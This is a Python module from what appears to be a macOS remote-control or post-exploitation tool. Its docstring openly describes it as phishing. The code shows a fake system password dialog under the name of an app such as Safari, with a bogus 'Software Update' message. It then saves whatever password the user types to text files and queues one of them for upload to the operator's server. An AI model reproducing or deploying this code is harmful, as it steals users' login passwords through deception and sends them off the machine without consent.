import os
from global_variables import run_command
from send_to_server import add_to_send_queue

"""
Displays a box on screen for the user to enter their password
Admin can decide which app this prompt comes from and the phishing message
Default app and message are used otherwise
Password is also stored for later use
"""
def run(options):
    appName = "Safari"
    message = "Software Update requires that you type your password to apply changes."
    if "appName" in options:
        appName = options["appName"]
    if "message" in options:
        message = options["message"]
    
    #Create phishing prompt on screen
    result = os.popen('''osascript -e 'tell app "'''+appName+'''" to activate' -e 'tell app "'''+appName+'''" to activate' -e 'tell app "'''+appName+'''" to display dialog "'''+message+'''" & return & return  default answer "" with icon 1 with hidden answer with title "'''+appName+'''"\'''').read()
    #extract password entered
    if "OK" in result:
        output = run_command(f"""echo "{result}" | cut -d":" -f3 | tr -d '\n'""")
        password = output.decode()
        run_command(f"""echo {password} > password.txt""")
        run_command(f"""echo {password} > upassword.txt""")
        add_to_send_queue("./password.txt")